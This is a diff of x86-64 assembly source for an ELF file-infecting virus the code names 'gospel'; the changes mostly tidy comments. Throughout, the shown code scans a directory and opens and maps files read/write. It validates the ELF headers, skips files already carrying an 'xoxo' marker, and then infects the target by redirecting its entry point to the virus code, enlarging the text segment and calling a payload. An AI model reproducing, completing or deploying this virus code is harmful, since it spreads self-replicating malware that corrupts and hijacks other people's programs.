@@ -611,8 +611,7 @@ check_file:
 
 		lea r12, [rcx + r14 + 618]
 		mov [r14 + 160], r12
-		;lea rdi, [rcx + r14 + 600 + linuxdirent.d_nameq]	;name of file in rdi
-		lea rdi, [rcx + r14 + 618]	;linuxdirent entry filename in rdi
+		lea rdi, [rcx + r14 + 618]	;linuxdirent entry filename (linuxdirent.d_nameq) in rdi
 		mov rsi, OPEN_RDWR 					;flags - read/write in rsi
 		xor rdx, rdx						;mode - 0
 		mov rax, SYS_OPEN
@@ -624,15 +623,12 @@ check_file:
 		mov r9, rax
 		mov r8, rax
 		mov [r14 + 144], rax
-		;mov [fd], rax
 		
 		xor r12, r12
 		mov rsi, rdi
 		lea rdi, [r14 + 200] 
 		mov rsi, [r14 + 160]	
-		;lea rsi, [rcx + r14 + 618]		;linuxdirent.d_nameq
 		.copy_filename:
-			;movsb
 			mov byte al, [rsi]
 			inc rsi
 			mov byte [rdi], al
@@ -641,8 +637,6 @@ check_file:
 			cmp byte [rsi], 0x0
 			jne .copy_filename
 		
-	;	mov r13, [r14 + 160]		;linuxdirent.d_nameq
-	;	call _write
 		xor rax, rax
 		push r9
 	check_filename:
@@ -662,7 +656,6 @@ check_file:
 			inc rsi
 			cmp rcx, 5
 			jnz .filenameloop
-		;jne get_filestat
 		jmp checknext
 
 	get_vx_name:
@@ -670,9 +663,8 @@ check_file:
 		vxname: db "gospel",0		
 
 	get_filestat:
-									;size for mmap == e_shoff + (e_shnum * e_shentsize)
-		lea rsi, [r14]				;or retrieve size from filestat struct with an fstat syscall
-		mov rdi, r8
+		lea rsi, [r14]				;size for mmap == e_shoff + (e_shnum * e_shentsize)
+		mov rdi, r8 				;retrieve size from filestat struct with an fstat syscall
 		mov rax, SYS_FSTAT
 		syscall
 
@@ -683,8 +675,7 @@ check_file:
 		xor rdi, rdi			;set RDI to NULL
 		mov rsi, [r14 + 48] 	;filestat.st_size
 		mov rdx, 0x3 			; (PROT_READ | PROT_WRITE)
-		mov r10, MAP_PRIVATE
-		;mov r8, fd				;fd is already in r8 so we don't need to set that reg again
+		mov r10, MAP_PRIVATE	;fd is already in r8 so we don't need to set that reg again
 		xor r9, r9				;offset of 0 within file == start of file, obv	
 		mov rax, SYS_MMAP
 		syscall
@@ -713,71 +704,31 @@ check_file:
 		jnz checknext
 
 	check_elf_header_magic_bytes:
-		;debug print check
-		;lea r13, checkelffail
-		;mov r12, checkelffaillen
-		
-		;cmp dword [rax + elf_ehdr.e_ident], 0x464c457f
 		cmp dword [rax], 0x464c457f			;elf_ehdr.e_ident
 		jnz checknext
 		
-		;debug print check
-		;lea r13, checkelfpass
-		;mov r12, checkelfpasslen
-		;call _write
-	
 	check_elf_header_64bit:
-		;debug print check
-		;lea r13, check64fail
-		;mov r12, check64faillen
-		;cmp byte [rax + elf_ehdr.e_ident+4], ELFCLASS64
 		cmp byte [rax + 4], ELFCLASS64
 		jne checknext
 		
-		;debug print check
-		;lea r13, check64pass
-		;mov r12, check64passlen
-		;call _write
-		;jmp ready2infect
-	
 	check_elf_header_arch:
-		;lea r13, checkarchfail
-		;mov r12, checkarchfaillen
-		;cmp byte [r14+800+elf_ehdr + 18], ELFX8664
-		;cmp byte [rax + elf_ehdr.e_machine], 0x3e
 		cmp byte [rax + 18], 0x3e			;elf_ehdr.e_machine
 		jne checknext
 		
-		;debug print check
-		;lea r13, checkarchpass
-		;mov r12, checkarchpasslen
-		;call _write
-		
 	verifie_pas_de_vx_sig:
-		;lea r13, [rax + elf_ehdr.e_entry]
-		lea r13, [rax + 24]
+		lea r13, [rax + 24]					;elf_ehdr.e_entry
 		cmp dword [r13 + 2], 0x786f786f
 		je checknext
 	
 	verifie_deja_infecte:
-		;cmp dword [rax + elf_ehdr.ei_padding], 0x786f786f
-		cmp dword [rax + 9], 0x786f786f
+		cmp dword [rax + 9], 0x786f786f		;elf_ehdr.ei_padding
 		je checknext
-		;lea r13, pasinfectepass
-		;mov r12, pasinfectepasslen
-		;call _write
 
 	ready2infect:
 		call infect	
 		jmp painting
 
 	checknext:
-		;mov r12, checkfiledtreg_fail_len
-		;lea r13, checkfile_dtreg_fail
-		;lea r13, [rcx + r14 + 600 + linuxdirent.d_nameq]
-		;lea r13, [r14 + 200]
-		;call _write
-		
 		mov rdi, fd
 		mov rsi, [r14 + 48] 			;filestat.st_size
 		mov rax, SYS_MUNMAP
@@ -788,8 +739,6 @@ check_file:
 		cmp qword rcx, [r14 + 500]
 		jne check_file
 		jmp _restore
-
-
 
 	painting:
 	call payload
@@ -894,14 +843,10 @@ payload:
 
 infect:
 	mov r13, [r14+ 800]					;location on stack where we saved address returned from mmap syscall
-	;mov r12, [r13 + elf_ehdr.e_phoff]	;address of host ELF Program Header Table in r12
-	mov r12, [r13 + 32]					;address of host ELF Program Header Table in r12
-	;mov r15, [r13 + elf_ehdr.e_shoff] 	;address of host ELF Section Header Table in r15
-	mov r15, [r13 + 40] 				;address of host ELF Section Header Table in r15
-	;mov r8, [r13 + elf_ehdr.e_entry] 	;address of host ELF entry point in r8
-	mov r8, [r13 + 24] 	;address of host ELF entry point in r8
+	mov r12, [r13 + 32]					;offset of host ELF Program Header Table in r12
+	mov r15, [r13 + 40] 				;offset of host ELF Section Header Table in r15
+	mov r8, [r13 + 24] 					;offset of host ELF entry point in r8
 
-	;mov dword [r13 + elf_ehdr.ei_padding], 0x786f786f		;infection marker string "xoxo" in elf_ehdr.e_padding
 	mov dword [r13 + 9], 0x786f786f		;infection marker string "xoxo" in elf_ehdr.e_padding
 	
 	;mov rdx, checkphdrstartlen
@@ -939,12 +884,10 @@ infect:
 ;****************************************************************************************
 	xor rcx, rcx
 	xor r11, r11
-	;mov word cx, [r13 + elf_ehdr.e_phnum]
-	mov word cx, [r13 + 56]			;elf_ehdr.e_phnum
+	mov word cx, [r13 + 56]					;elf_ehdr.e_phnum
 	check_phdrs:
 		.phdr_loop:
 			push rcx
-			;cmp word [r13 + r12 + elf_phdr.p_type], PT_LOAD			
 			cmp word [r13 + r12], PT_LOAD		;elf_phdr.p_type offset	
 			jne .mod_subsequent_phdr
 			.mod_curr_header:
@@ -954,10 +897,8 @@ infect:
 				;mov rax, SYS_WRITE
 				;syscall
 				
-				;cmp dword [r13 + r12 + elf_phdr.p_flags], PFLAGS_RX
 				cmp dword [r13 + r12 + 4], PFLAGS_RX		;elf_phdr.p_flags offset
 				je .mod_phdr_text_segment			
-				;cmp dword [r13 + r12 + elf_phdr.p_flags], PFLAGS_RW
 				cmp dword [r13 + r12 + 4], PFLAGS_RW		;elf_phdr.p_flags offset
 				je .mod_phdr_data_segment			
 				;jne .mod_subsequent_phdr
@@ -969,26 +910,19 @@ infect:
 					;mov rax, SYS_WRITE
 					;syscall
 				
-					;mov r10, [r13 + r12 + elf_phdr.p_vaddr] 	;entry virtual addr (evaddr) = phdr->p_vaddr + phdr->p_filesz
-					;add r10, [r13 + r12 + elf_phdr.p_filesz]
 					mov r10, [r13 + r12 + 16] 	;entry virtual addr (evaddr) = phdr->p_vaddr + phdr->p_filesz
-					add r10, [r13 + r12 + 32]	;elf_phdr.p_filesz offset
+					add r10, [r13 + r12 + 32]			;elf_phdr.p_filesz offset
 					mov qword [evaddr], r10				;save evaddr
 					
-					;add dword r10d, ventry				;new entry point of infected file = evaddr + ventry
-					;mov qword [r13 + elf_ehdr.e_entry], r10	; update ELF header entry point to point to virus code start
-					mov qword [r13 + 24], r10	; update ELF header entry point to point to virus code start
-					;mov r10, [r13 + r12 + elf_phdr.p_offset] 
+														;new entry point of infected file = evaddr + ventry
+					mov qword [r13 + 24], r10			; update ELF header entry point to point to virus code start
 					mov r10, [r13 + r12 + 8]			;elf_phdr.p_offset  
 					mov dword [hosttext_start], r10d
-					;add r10, qword [r13 + r12 + elf_phdr.p_filesz]				
-					add r10, [r13 + r12 + 32]	;elf_phdr.p_filesz offset
+					add r10, [r13 + r12 + 32]			;elf_phdr.p_filesz offset
 					mov dword [vxoffset], r10d
 					add qword [r13 + r12 + 32], vlen	;elf_phdr.p_filesz offset
 					add qword [r13 + r12 + 40], vlen	;elf_phdr.p_memsz offset
-					;add qword [r13 + r12 + elf_phdr.p_filesz], vlen	
-					;add qword [r13 + r12 + elf_phdr.p_memsz], vlen
-					jmp .next_phdr				;this jmp might be unneccessary but adding it for testing	
+					jmp .next_phdr						;this jmp might be unneccessary but adding it for testing	
 				.mod_phdr_data_segment:			
 					;mov rdx, checkphdrRWpasslen
 					;lea rsi, checkphdrRWpass
